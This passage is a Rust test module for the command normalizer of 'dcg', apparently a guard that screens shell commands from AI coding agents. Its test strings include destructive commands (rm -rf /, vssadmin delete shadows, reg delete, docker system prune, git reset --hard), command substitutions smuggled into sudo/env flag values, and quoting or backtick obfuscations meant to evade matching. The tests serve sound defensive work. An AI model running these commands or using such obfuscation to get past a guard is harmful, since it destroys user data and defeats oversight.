    fn quoted_redirect_operators_in_wrapper_values_remain_literal_issue_531() {
        for (command, expected) in [
            ("nice -n 5 git reset --hard", "git reset --hard"),
            ("nice -n 5 echo hi", "echo hi"),
            ("sudo -p 'password > ' git status", "git status"),
            ("sudo -p'password > ' git status", "git status"),
            (r"sudo -p password\> git status", "git status"),
            ("env -C '/tmp/a>b' git status", "git status"),
            ("env --chdir='/tmp/a > b' git status", "git status"),
            ("exec -a '>' git status", "git status"),
            ("exec -a \"2>\" git status", "git status"),
            ("time -f '>%e' git status", "git status"),
            ("FOO='>' git status", "git status"),
            ("nice -n 5 echo hi > /tmp/out", "echo hi > /tmp/out"),
        ] {
            assert_eq!(
                strip_wrapper_prefixes(command).normalized,
                expected,
                "quoted/escaped operators are argument data: {command}"
            );
        }
    }

    #[test]
    fn test_sudo_env_chain() {
        let result = strip_wrapper_prefixes("sudo env GIT_DIR=.git git reset --hard");
        assert_eq!(result.normalized, "git reset --hard");
        assert_eq!(result.stripped_wrappers.len(), 2);
    }

    #[test]
    fn test_env_split_string_handling() {
        // env -S treats the argument as a script/command line.
        // We parse the -S argument to extract the command and strip the wrapper.
        let result = strip_wrapper_prefixes("env -S \"git reset --hard\"");

        // Should be normalized
        assert!(result.was_normalized());
        assert_eq!(result.normalized, "git reset --hard");
        assert_eq!(result.stripped_wrappers.len(), 1);
        assert_eq!(result.stripped_wrappers[0].wrapper_type, "env");
        assert_eq!(
            result.stripped_wrappers[0].stripped_text,
            "env -S \"git reset --hard\""
        );
    }

    #[test]
    fn test_env_split_string_long_option() {
        let result = strip_wrapper_prefixes("env --split-string \"git reset --hard\"");
        assert!(result.was_normalized());
        assert_eq!(result.normalized, "git reset --hard");
        assert_eq!(result.stripped_wrappers[0].wrapper_type, "env");
    }

    #[test]
    fn test_env_chdir_long_option() {
        let result = strip_wrapper_prefixes("env --chdir /tmp git reset --hard");
        assert_eq!(result.normalized, "git reset --hard");
    }

    #[test]
    fn env_sudo_flag_value_with_substitution_is_not_stripped() {
        let dangerous = [
            "env -C /tmp/$(rm -rf /) git status",
            "env -u $(rm -rf /) git status",
            "env --chdir /tmp/$(rm -rf /) git status",
            "env -C/tmp/$(reboot) git status",
            "env --chdir=$(reboot) git status",
            "env -C `rm -rf /` git status",
            "env -C <(rm -rf /) git status",
            "sudo -D /tmp/$(rm -rf /) git status",
            "sudo -u $(rm -rf /) git status",
            "sudo -D/tmp/$(reboot) git status",
            "sudo -u `id` git status",
        ];
        for cmd in dangerous {
            let result = strip_wrapper_prefixes(cmd);
            assert!(
                !result
                    .stripped_wrappers
                    .iter()
                    .any(|w| matches!(w.wrapper_type, "env" | "sudo")),
                "env/sudo wrapper with a substitution in a flag value must NOT be stripped: {cmd} -> {:?}",
                result.normalized
            );
        }
    }

    #[test]
    fn quoted_windows_path_with_backslashes_is_not_mangled() {
        for cmd in [
            r#""C:/Program Files/Git/bin/git.exe" reset --hard"#,
            r#""C:\Program Files\Git\bin\git.exe" reset --hard"#,
        ] {
            let normalized = normalize_command(cmd);
            assert!(
                !normalized.contains("bingit"),
                "quoted path was mangled (bin+git glued): {cmd} -> {normalized}"
            );
            assert!(
                normalized.contains("git reset --hard"),
                "git must remain a matchable word: {cmd} -> {normalized}"
            );
        }
    }

    #[test]
    fn env_sudo_benign_flag_value_still_strips() {
        for (cmd, expected) in [
            ("env -C /tmp git reset --hard", "git reset --hard"),
            ("env --chdir=/tmp git reset --hard", "git reset --hard"),
            ("env -u FOO git reset --hard", "git reset --hard"),
            ("sudo -u root git reset --hard", "git reset --hard"),
            ("sudo -D /tmp git reset --hard", "git reset --hard"),
            ("sudo -uroot git reset --hard", "git reset --hard"),
        ] {
            let result = strip_wrapper_prefixes(cmd);
            assert!(
                result.was_normalized(),
                "should strip benign wrapper: {cmd}"
            );
            assert_eq!(result.normalized, expected, "for {cmd}");
        }
    }

    #[test]
    fn wrapper_filesystem_context_tracks_cwd_home_and_environment_changes() {
        for command in [
            "sudo psql -X -f safe.sql",
            "sudo -D /elsewhere -u other psql -X -f safe.sql",
            "command /usr/bin/env -C /elsewhere psql -X -f safe.sql",
            "env -C/elsewhere psql -X -f safe.sql",
            "env -vC '/another directory' psql -X -f safe.sql",
            "env --chdir=/elsewhere psql -X -f safe.sql",
            "env --chdir /elsewhere psql -X -f safe.sql",
            "env HOME=/elsewhere psql -c 'SELECT 1'",
            "HOME=/elsewhere command psql -c 'SELECT 1'",
            "env -- HOME=/elsewhere psql -c 'SELECT 1'",
            "env USERPROFILE=/elsewhere psql -c 'SELECT 1'",
            "env -i psql -c 'SELECT 1'",
            "env --ignore-environment psql -c 'SELECT 1'",
            "env -u HOME psql -c 'SELECT 1'",
            "env -uHOMEPATH psql -c 'SELECT 1'",
            "env --unset=HOMEDRIVE psql -c 'SELECT 1'",
            "env --unset 'HOME' psql -c 'SELECT 1'",
            "env -u PSQLRC psql -c 'SELECT 1'",
            "env -u \"$NAME\" psql -c 'SELECT 1'",
            "env -u H* psql -c 'SELECT 1'",
            "env -f environment.txt psql -c 'SELECT 1'",
            "env --file=environment.txt psql -c 'SELECT 1'",
            "exec -c psql -c 'SELECT 1'",
            "exec -lc -a label psql -c 'SELECT 1'",
            "mise exec -- psql -c 'SELECT 1'",
        ] {
            assert!(wrapper_changes_filesystem_context(command), "{command}");
        }
    }

    #[test]
    fn wrapper_filesystem_context_respects_option_operands_and_command_boundaries() {
        for command in [
            "psql -X -c 'SELECT 1'",
            "printf '%s' 'env -C /elsewhere HOME=/elsewhere sudo'",
            "command psql -X -c 'SELECT 1'",
            "nice -n 5 psql -X -c 'SELECT 1'",
            "env LABEL=value psql -X -f safe.sql",
            "env LABEL='HOME=/elsewhere' psql -X -f safe.sql",
            "env '$HOME'=value psql -X -f safe.sql",
            "env PSQLRC=safe.psql psql -c 'SELECT 1'",
            "PSQLRC=safe.psql psql -c 'SELECT 1'",
            "env -u LABEL psql -X -f safe.sql",
            "env -u -C psql -X -f safe.sql",
            "env -u--chdir psql -X -f safe.sql",
            "env --unset=-C psql -X -f safe.sql",
            "env -a -C psql -X -f safe.sql",
            "env --argv0 HOME psql -X -f safe.sql",
            "env --ignore-signal -C psql -X -f safe.sql",
            "env -u '$HOME' psql -X -f safe.sql",
            "env -- psql -X -c '--chdir=/elsewhere'",
            "env -- -C /elsewhere psql -X -f safe.sql",
            "env LABEL=value psql -X -c 'HOME=/elsewhere'",
            "exec -l psql -X -c 'SELECT 1'",
            "exec -a -c psql -X -c 'SELECT 1'",
            "exec -- psql -X -c 'SELECT 1'",
            "mise list --current",
        ] {
            assert!(!wrapper_changes_filesystem_context(command), "{command}");
        }
    }

    #[test]
    fn wrapper_filesystem_context_bounds_split_string_analysis_without_new_normalization() {
        for command in [
            "env -S '-C /elsewhere psql -X -f safe.sql'",
            "env --split-string='HOME=/elsewhere psql -c SELECT'",
            "env -S '-u LABEL env -C /elsewhere psql -X -f safe.sql'",
            "env -S 'exec -c psql -c SELECT'",
            "env -S '--unknown-option psql -X -f safe.sql'",
        ] {
            assert!(wrapper_changes_filesystem_context(command), "{command}");
        }
        for command in [
            "env -S 'psql -X -f safe.sql'",
            "env -S '-u LABEL psql -X -f safe.sql'",
            "env -S '-a -C psql -X -f safe.sql'",
            "env -S '-- psql -X -c --chdir=/elsewhere'",
        ] {
            assert!(!wrapper_changes_filesystem_context(command), "{command}");
        }
        assert_eq!(
            strip_wrapper_prefixes("env -S '-C /elsewhere psql -X -f safe.sql'").normalized,
            "-C /elsewhere psql -X -f safe.sql",
            "context observation must not add a new normalization rule"
        );
        let beyond_wrapper_limit = format!("{}psql -X -f safe.sql", "command ".repeat(40));
        assert!(wrapper_changes_filesystem_context(&beyond_wrapper_limit));
    }

    #[test]
    fn test_env_unknown_long_option_not_stripped() {
        let result = strip_wrapper_prefixes("env --not-a-real-flag git reset --hard");
        assert!(!result.was_normalized());
    }

    #[test]
    fn test_empty_command() {
        let result = strip_wrapper_prefixes("");
        assert!(!result.was_normalized());
    }

    #[test]
    fn test_no_wrappers() {
        let result = strip_wrapper_prefixes("git status");
        assert!(!result.was_normalized());
    }

    #[test]
    fn test_sudo_with_shell_flag() {
        // -s runs user's shell; command is passed via -c
        let result = strip_wrapper_prefixes("sudo -s git reset --hard");
        assert_eq!(result.normalized, "git reset --hard");
        assert_eq!(result.stripped_wrappers[0].wrapper_type, "sudo");
    }

    #[test]
    fn test_sudo_shell_alone() {
        // sudo -s alone (no command) should not be stripped
        let result = strip_wrapper_prefixes("sudo -s");
        assert!(!result.was_normalized());
    }

    #[test]
    fn test_sudo_with_bell_flag() {
        // -B rings bell on password prompt
        let result = strip_wrapper_prefixes("sudo -B git reset --hard");
        assert_eq!(result.normalized, "git reset --hard");
    }

    #[test]
    fn test_sudo_with_chdir() {
        // -D changes directory before running command
        let result = strip_wrapper_prefixes("sudo -D /tmp git reset --hard");
        assert_eq!(result.normalized, "git reset --hard");
    }

    #[test]
    fn test_sudo_with_type() {
        // -t changes SELinux type
        let result = strip_wrapper_prefixes("sudo -t unconfined_t git reset --hard");
        assert_eq!(result.normalized, "git reset --hard");
    }

    #[test]
    fn test_sudo_combined_shell_flags() {
        // Combined flags including -s
        let result = strip_wrapper_prefixes("sudo -EBs git reset --hard");
        assert_eq!(result.normalized, "git reset --hard");
    }

    #[test]
    fn test_dequote_preserves_rm_quoted_paths() {
        assert_eq!(
            dequote_segment_command_words(r#"rm -rf "/tmp/foo""#).as_ref(),
            r#"rm -rf "/tmp/foo""#
        );
        assert_eq!(
            dequote_segment_command_words(r#"rm -r -f "$TMPDIR/foo""#).as_ref(),
            r#"rm -r -f "$TMPDIR/foo""#
        );
    }

    #[test]
    fn test_dequote_normalizes_git_quoted_subcommand() {
        assert_eq!(
            dequote_segment_command_words(r#"git "reset" --hard"#).as_ref(),
            "git reset --hard"
        );
    }

    #[test]
    fn dcg_global_option_syntax_is_decoded_without_promoting_agent_data() {
        for dialect in [ShellDialect::Posix, ShellDialect::PowerShell] {
            for (command, expected) in [
                (
                    "dcg --a'gent'=codex --ro'bot' uninstall",
                    "dcg --agent=codex --robot uninstall",
                ),
                (
                    "dcg --agent co'dex' --robot uninstall",
                    "dcg --agent codex --robot uninstall",
                ),
                (
                    "dcg allowlist --a'gent'=codex --no'-color' add rule",
                    "dcg allowlist --agent=codex --no-color add rule",
                ),
                (
                    "dcg --a'gent'= --robot uninstall",
                    "dcg --agent= --robot uninstall",
                ),
                (
                    "dcg '--agent=codex' --robot uninstall",
                    "dcg --agent=codex --robot uninstall",
                ),
                (
                    "dcg --a'gent'='two words' doctor",
                    "dcg --agent='two words' doctor",
                ),
            ] {
                assert_eq!(
                    normalize_command_in_dialect(command, dialect),
                    expected,
                    "{dialect:?}: {command}"
                );
            }
            for command in [
                "dcg --agent='dcg --robot uninstall' doctor",
                "dcg --agent 'dcg --robot uninstall' doctor",
                "dcg --agent='$profile' doctor",
                "dcg --agent '/tmp/profile' doctor",
                "dcg --agent 'codex; rm -rf /' doctor",
                "dcg --agent 'co`dex' doctor",
                "dcg test --a'gent'=codex",
                "dcg --unknown-option --a'gent'=codex uninstall",
                "dcg -- --a'gent'=codex uninstall",
                "other --a'gent'=codex --robot uninstall",
                "printf '%s' \"dcg --a'gent'=codex --robot uninstall\"",
            ] {
                assert_eq!(
                    normalize_command_in_dialect(command, dialect),
                    command,
                    "opaque arguments retain their structure: {dialect:?}: {command}"
                );
            }
        }
        assert_eq!(
            normalize_command_in_dialect(
                "dcg --a`gent=codex --robot uninstall",
                ShellDialect::PowerShell,
            ),
            "dcg --agent=codex --robot uninstall"
        );
        for dialect in [ShellDialect::Cmd, ShellDialect::Unknown] {
            let command = "dcg --a'gent'=codex --robot uninstall";
            assert_eq!(normalize_command_in_dialect(command, dialect), command);
        }
        let stopped = "dcg --% --a'gent'=codex --robot uninstall";
        assert_eq!(
            normalize_command_in_dialect(stopped, ShellDialect::PowerShell),
            stopped
        );
    }

    #[test]
    fn powershell_dcg_prefix_uses_native_words_and_preserves_opaque_values() {
        for (command, expected) in [
            (
                "dcg --a`gent=codex --r`obot un`install",
                "dcg --agent=codex --robot uninstall",
            ),
            (
                "d`cg --a`gent co`dex --r`obot un`install",
                "dcg --agent codex --robot uninstall",
            ),
            (
                "dcg allowl`ist --a`gent=codex --no-c`olor a`dd rule",
                "dcg allowlist --agent=codex --no-color add rule",
            ),
            (
                "dcg --a`gent='two words' un`install",
                "dcg --agent='two words' uninstall",
            ),
            (
                "dcg --a`gent='two 'words un`install",
                "dcg --agent='two 'words uninstall",
            ),
            (
                "dcg \"--a`gent=two words\" un`install",
                "dcg --agent=\"two words\" uninstall",
            ),
            (
                "dcg --a`gent`='two words' un`install",
                "dcg --agent='two words' uninstall",
            ),
            (
                "dcg --a`gent=co`ndex un`install",
                "dcg --agent=co`ndex uninstall",
            ),
            (
                "dcg --a`gent='co`dex; dcg un`install' doctor",
                "dcg --agent='co`dex; dcg un`install' doctor",
            ),
            (
                "dcg --a`gent=$profile un`install",
                "dcg --agent=$profile uninstall",
            ),
            (
                "dcg --a`gent=/tmp/profile un`install",
                "dcg --agent=/tmp/profile uninstall",
            ),
            (
                "dcg --a`gent=`\r\ncodex un`install",
                "dcg --agent=codex uninstall",
            ),
        ] {
            assert_eq!(
                normalize_command_in_dialect(command, ShellDialect::PowerShell),
                expected,
                "{command}"
            );
        }
    }

    #[test]
    fn powershell_executable_decoding_preserves_string_expression_ownership() {
        for command in [
            "\"dcg --a`gent=codex un`install\"",
            "Write-Output $(\"dcg --a`gent=codex un`install\")",
            "Write-Output $(\"d`cg --a`gent=codex un`install\")",
            "Write-Output ready & \"dcg --a`gent=codex un`install\"",
            "Write-Output $(Get-Date) & \"dcg --a`gent=codex un`install\"",
            "Write-Output $(@\"\ndcg --a`gent=codex un`install\n\"@)",
        ] {
            assert_eq!(
                decode_powershell_pattern_view(command),
                command,
                "a string expression is not an executable argv word: {command}"
            );
        }

        for (command, expected) in [
            ("d`cg uninstall", "dcg uninstall"),
            (
                "Write-Output $(d`cg un`install)",
                "Write-Output $(dcg un`install)",
            ),
            ("& \"d`cg\" uninstall", "& \"dcg\" uninstall"),
            (". \"d`cg\" uninstall", ". \"dcg\" uninstall"),
            (
                "Write-Output $(& \"d`cg\" uninstall)",
                "Write-Output $(& \"dcg\" uninstall)",
            ),
            (
                "Write-Output $(Get-Date); & \"d`cg\" uninstall",
                "Write-Output $(Get-Date); & \"dcg\" uninstall",
            ),
        ] {
            assert_eq!(
                decode_powershell_pattern_view(command),
                expected,
                "executed command words still expose their literal spelling: {command}"
            );
        }
    }

    #[test]
    fn powershell_invocation_operator_view_reads_operators_in_command_position() {
        for (command, expected) in [
            (". git reset --hard", "& git reset --hard"),
            (". 'git' reset --hard", "& 'git' reset --hard"),
            ("echo a; . git x", "echo a; & git x"),
            ("a | . git x", "a | & git x"),
            ("a\n. git x", "a\n& git x"),
            ("if ($true) { . git x }", "if ($true) { & git x }"),
            ("return . git x", "       & git x"),
            ("THROW . git x", "      & git x"),
            ("exit . git x", "     & git x"),
            (".\u{a0}git x", "&\u{a0}git x"),
            (".'git' x", "&'git' x"),
            (".\"git\" x", "&\"git\" x"),
            ("echo a; .'git' x", "echo a; &'git' x"),
            (".'iex' 'git x'", "&'iex' 'git x'"),
            (". ./x.ps1", "& ./x.ps1"),
            // An assignment's value is its own statement in
            // `powershell_assignment_views`, which reads the operator there.
            ("$r;. git x", "$r;& git x"),
            ("$r;.'git' x", "$r;&'git' x"),
            // The call operator itself, outside a statement start.
            ("return & 'git' x", "       & 'git' x"),
            ("exit & git x", "     & git x"),
        ] {
            assert_eq!(
                powershell_invocation_operator_view(command).as_deref(),
                Some(expected),
                "{command:?}"
            );
        }
        for command in [
            ". $profile",
            ". \"$PSScriptRoot\\x.ps1\"",
            ". { Get-Date }",
            ". @('git')",
            ". ('git') x",
            "git add .",
            "echo . git x",
            ".git x",
            ".\u{200b}git x",
            "(Get-Item x) . git",
            "Write-Output '. git x'",
            "Write-Output . git x",
            "return. git x",
            "$r=.git x",
            "$r -eq . git x",
            "Write-Output .'git' x",
            "'x'.'git'",
            "$r.'git'",
            ".\"$PSScriptRoot\\x.ps1\"",
            "git config a=.'x'",
            "a=.'git' x",
            "$r = 1 + . git x",
            "git config a= . git x",
            // A call operator at a statement start, or with a dynamic operand.
            "& git x",
            "echo a; & 'git' x",
            "$r = & $x",
            "$r = & (Join-Path $PSScriptRoot 'x.ps1')",
            "$r = & { git x }",
            "git status & 'git' x",
            "x=1 & git x",
            // Assignments: see `powershell_assignment_views`.
            "$r = . git x",
            "$r=.'git' x",
            "$r = & 'git' x",
        ] {
            assert_eq!(
                powershell_invocation_operator_view(command),
                None,
                "{command:?}"
            );
        }
    }

    #[test]
    fn dcg_prefix_does_not_promote_data_or_guess_shell_escape_semantics() {
        for command in [
            "dcg --agent 'uninstall' doctor",
            "dcg --agent 'dcg --robot uninstall' doctor",
            "dcg --a`gent='co`dex; dcg un`install' doctor",
            "dcg --agent=$(Write-Output 'dcg un`install') doctor",
            "dcg --% --a`gent=codex un`install",
            "dcg '--%' --a`gent=codex un`install",
            "dcg --unknown --a`gent=codex un`install",
            "dcg doctor --a`gent=codex un`install",
            "dcg --ro`bot uninstall",
            "dcg \"--ro`bot\" uninstall",
            "dcg --ag`ent=codex uninstall",
            "other --a`gent=codex un`install",
            "Write-Output 'dcg --a`gent=codex un`install'",
            "Write-Output $(\"dcg --a`gent=codex un`install\")",
            "Write-Output $(\"d`cg --a`gent=codex un`install\")",
        ] {
            let expected = match command {
                "dcg --agent 'uninstall' doctor" => "dcg --agent uninstall doctor",
                "dcg --a`gent='co`dex; dcg un`install' doctor" => {
                    "dcg --agent='co`dex; dcg un`install' doctor"
                }
                _ => command,
            };
            assert_eq!(
                normalize_command_in_dialect(command, ShellDialect::PowerShell),
                expected,
                "{command}"
            );
        }

        for dialect in [
            ShellDialect::Posix,
            ShellDialect::Unknown,
            ShellDialect::Cmd,
        ] {
            for command in [
                "dcg --a`gent=codex --robot uninstall",
                "dcg --agent=`printf '%s' codex` doctor",
                "dcg --agent='co`dex' doctor",
            ] {
                assert_eq!(normalize_command_in_dialect(command, dialect), command);
            }
        }
    }

    #[test]
    fn dcg_agent_assignment_keeps_the_original_value_quote_mode() {
        for (command, expected) in [
            (
                "dcg --a'gent'=\"$profile\" uninstall",
                "dcg --agent=\"$profile\" uninstall",
            ),
            (
                "dcg '--a'gent='two 'words uninstall",
                "dcg --agent='two 'words uninstall",
            ),
            (
                "dcg \"--a'gent'=two words\" uninstall",
                "dcg \"--a'gent'=two words\" uninstall",
            ),
            (
                "dcg '--agent=two words' uninstall",
                "dcg --agent='two words' uninstall",
            ),
            (
                "dcg $'--agent=two\\nwords' uninstall",
                "dcg --agent=$'two\\nwords' uninstall",
            ),
            (
                "dcg --a'gent'='dcg --robot uninstall' doctor",
                "dcg --agent='dcg --robot uninstall' doctor",
            ),
        ] {
            assert_eq!(
                normalize_command_in_dialect(command, ShellDialect::Posix),
                expected,
                "{command}"
            );
        }
    }

    #[test]
    fn test_normalize_preserves_nested_command_substitution_quotes() {
        let cmd = r#"echo "$(printf "%s" "<(docker system prune -a --volumes)")""#;
        assert_eq!(normalize_command(cmd).as_ref(), cmd);
    }

    #[test]
    fn test_normalize_preserves_process_substitution_words() {
        let input = "cat <(docker system prune -a --volumes)";
        let output = "cat >(docker system prune -a --volumes)";

        assert_eq!(normalize_command(input).as_ref(), input);
        assert_eq!(normalize_command(output).as_ref(), output);
    }

    #[test]
    fn test_mismatched_quotes_not_unquoted() {
        // Mismatched quotes should NOT be unquoted
        assert_eq!(
            normalize_command_word_token(r#""hello'"#),
            None // No normalization should occur
        );
        assert_eq!(
            normalize_command_word_token(r#"'hello""#),
            None // No normalization should occur
        );
        // But matching quotes should still work
        assert_eq!(
            normalize_command_word_token(r#""hello""#),
            Some("hello".to_string())
        );
        assert_eq!(
            normalize_command_word_token("'hello'"),
            Some("hello".to_string())
        );
    }

    // =========================================================================
    // Issue #257: `mise exec`/`mise x` execution-frontend stripping
    // =========================================================================

    #[test]
    fn mise_exec_with_explicit_dashdash_strips_to_wrapped_command() {
        assert_eq!(
            strip_posix_execution_frontend("mise exec -- git status"),
            Some(("git status", "mise-exec"))
        );
        // The `mise x` alias with a TOOL@VERSION spec before `--`.
        assert_eq!(
            strip_posix_execution_frontend("mise x node@20 -- npm run build"),
            Some(("npm run build", "mise-exec"))
        );
        // Exec options and multiple tool specs before `--` are skipped too.
        assert_eq!(
            strip_posix_execution_frontend("mise exec node@20 python@3.12 -- git status"),
            Some(("git status", "mise-exec"))
        );
    }

    #[test]
    fn mise_exec_strips_at_the_first_bare_word_and_bails_on_unknown_options() {
        // Without `--`, mise's tool-spec/command boundary is ambiguous, so
        // the wrapper is left in place.
        // The wrapped command starts at the first bare word — mise's real
        // grammar — so a later `--` is the command's own argv (v0.9.0
        // review false negative: scanning to the first `--` anywhere
        // stripped `mise exec rm -rf / -- ok` down to `ok`).
        assert_eq!(
            strip_posix_execution_frontend("mise exec git status"),
            Some(("git status", "mise-exec"))
        );
        assert_eq!(
            strip_posix_execution_frontend("mise exec rm -rf / -- ok"),
            Some(("rm -rf / -- ok", "mise-exec"))
        );
        assert_eq!(
            strip_posix_execution_frontend("mise exec node@20 git reset --hard -- ."),
            Some(("git reset --hard -- .", "mise-exec"))
        );
        // Modeled option arity: `-C/--cd`, `-E/--env`, `-j/--jobs` consume
        // their value, so the value cannot be mistaken for the command.
        assert_eq!(
            strip_posix_execution_frontend("mise exec --cd /tmp git status"),
            Some(("git status", "mise-exec"))
        );
        // Unknown options bail: the next word could be their value.
        assert_eq!(
            strip_posix_execution_frontend("mise exec -p echo rm -rf /"),
            None
        );
        // Global flags precede the subcommand (v0.9.1 review).
        assert_eq!(
            strip_posix_execution_frontend("mise -v exec -- git status"),
            Some(("git status", "mise-exec"))
        );
        assert_eq!(
            strip_posix_execution_frontend("mise --cd /tmp exec git status"),
            Some(("git status", "mise-exec"))
        );
        assert_eq!(
            strip_posix_execution_frontend("mise -X exec -- git status"),
            None
        );
        // Known boolean flags and value-taking flags after the subcommand.
        assert_eq!(
            strip_posix_execution_frontend("mise exec -y git status"),
            Some(("git status", "mise-exec"))
        );
        assert_eq!(
            strip_posix_execution_frontend("mise exec --allow-net github.com git status"),
            Some(("git status", "mise-exec"))
        );
        // `-c/--command` carries an inline shell string; never strip past it.
        assert_eq!(
            strip_posix_execution_frontend("mise exec -c \"echo hi\""),
            None
        );
        // Non-exec subcommands never wrap a command.
        assert_eq!(strip_posix_execution_frontend("mise install node"), None);
        // `--` with nothing after it wraps no command at all.
        assert_eq!(strip_posix_execution_frontend("mise exec --"), None);
        // Terminal options print and exit; nothing is wrapped.
        assert_eq!(
            strip_posix_execution_frontend("mise exec --help -- foo"),
            None
        );
    }

    #[test]
    fn strip_wrapper_prefixes_unwraps_mise_exec_chains() {
        let result = strip_wrapper_prefixes("mise exec -- git reset --hard");
        assert!(result.was_normalized());
        assert_eq!(result.normalized, "git reset --hard");

        let untouched = strip_wrapper_prefixes("mise install node");
        assert!(!untouched.was_normalized());
    }
}

#[cfg(test)]
mod windows_exe_tests {
    use super::*;

    #[test]
    fn test_backslash_exe_normalization() {
        let result = strip_wrapper_prefixes(r"\git.exe reset --hard");
        eprintln!("After strip_wrapper_prefixes: {:?}", result.normalized);
        assert!(result.was_normalized(), "backslash should be stripped");
        assert_eq!(result.normalized, "git.exe reset --hard");
    }

    #[test]
    fn test_exe_stripping_in_normalize_command() {
        let result = normalize_command(r"\git.exe reset --hard");
        eprintln!("Normalized result: {:?}", result.as_ref());
        assert_eq!(result.as_ref(), "git reset --hard");
    }

    #[test]
    fn test_windows_destructive_exe_path_normalization() {
        // Path-qualified Windows system exes normalize to the bare verb so the
        // windows.* pack patterns (which match the bare verb) fire. The exe name
        // and the `.exe`/`.com` suffix are matched case-insensitively; path-like
        // ARGUMENTS must be preserved (only the leading binary path is stripped).
        let cases = [
            (r"C:\Windows\System32\diskpart.exe", "diskpart"),
            (r"C:\Windows\System32\DiskPart.EXE", "DiskPart"),
            (
                r"C:/Windows/System32/vssadmin.exe delete shadows /all",
                "vssadmin delete shadows /all",
            ),
            (
                r"C:\Windows\System32\reg.exe delete HKLM\Foo /f",
                r"reg delete HKLM\Foo /f",
            ),
            (
                r"C:\Windows\System32\robocopy.EXE src dst /MIR",
                "robocopy src dst /MIR",
            ),
        ];
        for (input, expected) in cases {
            let got = normalize_command(input);
            assert_eq!(got.as_ref(), expected, "normalize({input:?})");
        }

        // A path-like ARGUMENT (not the leading binary) must NOT be stripped.
        let arg = normalize_command(r"reg delete C:\Windows\System32\config");
        assert_eq!(arg.as_ref(), r"reg delete C:\Windows\System32\config");

        // Unix verbs are unaffected and stay case-sensitive.
        let unix = normalize_command("/usr/bin/git status");
        assert_eq!(unix.as_ref(), "git status");
    }
}

#[test]
fn test_windows_path_with_spaces_tokenization() {
    // This path has spaces - see how tokenization handles it
    let cmd = "C:/Program Files/Git/bin/git.exe reset --hard";
    let tokens = tokenize_for_normalization(cmd);
    eprintln!("Tokens:");
    for (i, tok) in tokens.iter().enumerate() {
        eprintln!("  {}: {:?} = {:?}", i, tok.kind, tok.text(cmd));
    }

    // The second token should contain git.exe
    let has_git_exe = tokens.iter().any(|t| {
        t.kind == NormalizeTokenKind::Word
            && t.text(cmd).unwrap_or("").to_lowercase().contains("git.exe")
    });
    eprintln!("Has git.exe: {has_git_exe}");
}

#[test]
fn test_quoted_windows_path_normalization() {
    // Use git status instead of git reset to avoid triggering DCG in tests
    let cmd = r#""C:/Program Files/Git/bin/git.exe" status"#;
    eprintln!("Input: {cmd}");

    let result = normalize_command(cmd);
    eprintln!("Normalized: {:?}", result.as_ref());

    let tokens = tokenize_for_normalization(&result);
    eprintln!("Tokens after normalization:");
    for (i, tok) in tokens.iter().enumerate() {
        eprintln!("  {}: {:?} = {:?}", i, tok.kind, tok.text(&result));
    }
}

#[test]
fn test_keyword_matching_in_windows_path() {
    use crate::packs::pack_aware_quick_reject;

    let keywords: Vec<&str> = vec!["git", "rm"];

    // Test if quick_reject correctly identifies these as git commands
    // Using "git status" instead of destructive commands
    let cmds = [
        r#""C:/Program Files/Git/bin/git" status"#,
        r#""C:/Program Files/Git/bin/git.exe" status"#, // with .exe
        "C:/Git/bin/git status",
        "git status",
    ];

    for cmd in cmds {
        // First check what classify_command returns
        let normalized = normalize_command(cmd);
        let spans = crate::context::classify_command(&normalized);
        eprintln!("{cmd:?} -> normalized: {:?}", normalized.as_ref());
        eprintln!("  executable spans:");
        for span in spans.executable_spans() {
            eprintln!("    {:?}", span.text(&normalized));
        }

        let rejected = pack_aware_quick_reject(cmd, &keywords);
        eprintln!("  quick_reject={rejected}");
        // If rejected is FALSE, keywords were found (should NOT be quick-rejected)
        assert!(!rejected, "Command should NOT be quick-rejected: {cmd}");
    }
}

#[test]
fn test_internal_backslash_normalization() {
    // g\it should normalize to git (bash treats backslash as escape for regular chars)
    let result = normalize_command_word_token(r"g\it");
    assert_eq!(
        result,
        Some("git".to_string()),
        "g\\it should normalize to git"
    );

    // Multiple internal backslashes
    let result = normalize_command_word_token(r"g\i\t");
    assert_eq!(
        result,
        Some("git".to_string()),
        "g\\i\\t should normalize to git"
    );

    // Full command normalization
    let result = normalize_command(r"g\it reset --hard");
    assert_eq!(
        result.as_ref(),
        "git reset --hard",
        "g\\it command should normalize"
    );
}

#[test]
fn test_mixed_quoting_normalization() {
    // g'i't should normalize to git (bash concatenates adjacent quoted/unquoted sections)
    let result = normalize_command_word_token("g'i't");
    assert_eq!(
        result,
        Some("git".to_string()),
        "g'i't should normalize to git"
    );

    // Double quotes
    let result = normalize_command_word_token(r#"g"i"t"#);
    assert_eq!(
        result,
        Some("git".to_string()),
        r#"g"i"t should normalize to git"#
    );

    // Full command normalization
    let result = normalize_command("g'i't reset --hard");
    assert_eq!(
        result.as_ref(),
        "git reset --hard",
        "g'i't command should normalize"
    );
}

#[test]
fn test_attached_redirection_normalization_after_quoted_command() {
    assert_eq!(
        normalize_command_word_token(r#""git">/dev/null"#),
        Some("git >/dev/null".to_string())
    );

    assert_eq!(
        normalize_command_word_token(r#""git"&>/dev/null"#),
        Some("git &>/dev/null".to_string())
    );

    assert_eq!(
        normalize_command_word_token(r#""git"&>>/dev/null"#),
        Some("git &>>/dev/null".to_string())
    );

    assert_eq!(
        normalize_command_word_token("git&>/dev/null"),
        Some("git &>/dev/null".to_string())
    );

    assert_eq!(
        normalize_command_word_token("git&>>/dev/null"),
        Some("git &>>/dev/null".to_string())
    );

    assert_eq!(
        normalize_command_word_token("git>/dev/null"),
        Some("git >/dev/null".to_string())
    );

    assert_eq!(
        normalize_command_word_token("git>>/dev/null"),
        Some("git >>/dev/null".to_string())
    );

    assert_eq!(
        normalize_command(r#""git">/dev/null reset --hard"#).as_ref(),
        "git >/dev/null reset --hard"
    );

    assert_eq!(
        normalize_command(r#""git"&>/dev/null reset --hard"#).as_ref(),
        "git &>/dev/null reset --hard"
    );

    assert_eq!(
        normalize_command(r#""git"&>>/dev/null reset --hard"#).as_ref(),
        "git &>>/dev/null reset --hard"
    );

    assert_eq!(
        normalize_command("git&>/dev/null reset --hard").as_ref(),
        "git &>/dev/null reset --hard"
    );

    assert_eq!(
        normalize_command("git&>>/dev/null reset --hard").as_ref(),
        "git &>>/dev/null reset --hard"
    );

    assert_eq!(
        normalize_command("git>/dev/null reset --hard").as_ref(),
        "git >/dev/null reset --hard"
    );

    assert_eq!(
        normalize_command("git>>/dev/null reset --hard").as_ref(),
        "git >>/dev/null reset --hard"
    );

    assert_eq!(
        normalize_command_word_token(">>"),
        None,
        "standalone append redirect must not be rewritten as a command token"
    );

